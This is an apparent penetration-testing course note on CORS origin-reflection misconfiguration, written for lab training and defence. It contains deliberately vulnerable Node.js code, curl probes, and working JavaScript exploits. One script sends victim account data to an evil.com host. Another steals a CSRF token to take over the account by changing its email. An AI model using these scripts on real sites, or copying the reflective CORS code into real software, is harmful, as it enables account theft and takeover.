---
tags: [vapt, cors, intermediate]
difficulty: intermediate
module: "12 - CORS"
topic: "12.04 Origin Reflection Misconfiguration"
portswigger_labs: ["CORS vulnerability with basic origin reflection"]
---

# 12.04 — Origin Reflection Misconfiguration

## What Is Origin Reflection?

```
VULNERABLE SERVER BEHAVIOR:
  Server blindly echoes back whatever Origin header it receives
  as Access-Control-Allow-Origin.
  
  Request:
    Origin: https://evil.com
  
  Response:
    Access-Control-Allow-Origin: https://evil.com
    Access-Control-Allow-Credentials: true
  
  EFFECT: ANY website in the world has full authenticated access!
  
WHY IT HAPPENS:
  Developers wanted to support multiple frontends dynamically.
  Instead of maintaining a whitelist, they reflect the origin.
  
  BAD CODE (Node.js):
    app.use((req, res, next) => {
      res.header('Access-Control-Allow-Origin', req.headers.origin);
      res.header('Access-Control-Allow-Credentials', 'true');
      next();
    });
```

---

## Detecting Origin Reflection

```bash
# STEP 1: TEST WITH EVIL ORIGIN:
curl -v \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=YOUR_SESSION_HERE" \
  https://target.com/api/account

# VULNERABLE RESPONSE:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com     ← echoed!
Access-Control-Allow-Credentials: true             ← creds allowed!
Content-Type: application/json

{"username": "victim", "email": "victim@email.com", ...}

# SAFE RESPONSE (whitelist):
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.target.com  ← not reflected
# OR: no CORS headers at all

# SAFE RESPONSE (wildcard, no creds):
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
# no Access-Control-Allow-Credentials header

# TEST ALL SENSITIVE ENDPOINTS:
for endpoint in /api/account /api/profile /api/settings /api/admin; do
  echo "Testing $endpoint:"
  curl -s -I -H "Origin: https://evil.com" \
    -H "Cookie: session=YOURS" \
    "https://target.com$endpoint" | grep -i "access-control"
done
```

---

## Exploiting Origin Reflection

```javascript
// COMPLETE ATTACK — READ SENSITIVE DATA FROM VICTIM'S ACCOUNT:

// HOSTED ON: https://evil.com/cors-attack.html
<script>
fetch('https://target.com/api/account', {
  credentials: 'include'   // ← sends victim's session cookie!
})
.then(r => r.json())
.then(data => {
  // We can READ the response because ACAO reflects evil.com!
  console.log('Victim data:', data);
  
  // Exfiltrate to attacker's server:
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
})
.catch(err => console.log('CORS blocked:', err));
</script>

// WHAT ATTACKER SEES ON THEIR SERVER:
// POST /steal HTTP/1.1
// Body: {"username": "victim", "email": "victim@victim.com", 
//        "api_key": "sk-abc123...", "credit_card": "4111..."}
```

---

## Exploiting to Account Takeover

```javascript
// CHAIN: CORS misconfig → read CSRF token → change email → ATO

<script>
async function exploit() {
  // STEP 1: Read account page (contains CSRF token)
  const accountPage = await fetch('https://target.com/account', {
    credentials: 'include'
  }).then(r => r.text());
  
  // STEP 2: Extract CSRF token from response
  const csrf = accountPage.match(/csrf[_-]?token['"]\s+value=['"]([^'"]+)/i)?.[1]
    || accountPage.match(/name="csrf" value="([^"]+)"/)?.[1];
  
  if (!csrf) { console.log('No CSRF token found'); return; }
  
  // STEP 3: Change email using extracted CSRF token
  const formData = new URLSearchParams();
  formData.append('email', 'attacker@evil.com');
  formData.append('csrf_token', csrf);
  
  await fetch('https://target.com/account/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: formData.toString()
  });
  
  // STEP 4: Exfiltrate confirmation
  new Image().src = 'https://evil.com/log?status=email_changed';
}

exploit();
</script>
```

---

## Variations of Origin Reflection

```
VARIATION 1: Only reflects if Origin is present:
  → Some servers don't add CORS headers for same-origin requests
  → Adding Origin: header triggers reflection
  → This is still vulnerable!

VARIATION 2: Checks domain suffix (weak regex):
  if (origin.endsWith('target.com')) allow();
  → evil-target.com → matches! → bypass!
  → attacker.target.com → matches (intended, but what if subdomain takeover?)

VARIATION 3: Checks for substring:
  if (origin.includes('target')) allow();
  → targetattacker.com → matches!

VARIATION 4: Reflects ALL origins but requires HTTPS:
  if (origin.startsWith('https://')) allow();
  → Any HTTPS site gets access!
  → Still critical!

VARIATION 5: Reflects for internal check bypass:
  Server in private network reflects any origin
  → Accessible if user is on VPN or internal network
  → Lower risk but still worth noting
```

---

## Burp Suite Workflow

```
BURP WORKFLOW FOR CORS TESTING:

1. Open Burp, enable proxy
2. Log in to target.com
3. Navigate around → populate HTTP History

4. In HTTP History:
   → Find API endpoints (look for /api/, JSON responses)
   → Send to Repeater

5. In Repeater:
   → Add header: Origin: https://evil.com
   → Send
   → Check response for ACAO header

6. If ACAO matches evil.com + ACAC: true:
   → VULNERABLE!

7. Build PoC:
   → Use attack script above
   → Host on any web server (python -m http.server 8080)
   → Open in browser while logged into target.com
   → Verify data theft works

BURP ACTIVE SCANNER:
   → Scan target → CORS misconfiguration is a built-in check
   → Scanner will automatically test origin reflection
```

---

## Related Notes
- [[01 - What is CORS and Why It Exists]] — CORS fundamentals
- [[03 - CORS Headers Full Reference]] — headers explained
- [[05 - Null Origin Misconfiguration]] — null origin bypass
- [[07 - Subdomain Trust]] — subdomain-based CORS bypass
- [[09 - CORS to Credential Theft]] — full exploit chain
- [[10 - CORS to Account Takeover Chain]] — ATO chain
- [[12 - Defense Strict Origin Whitelisting]] — how to fix
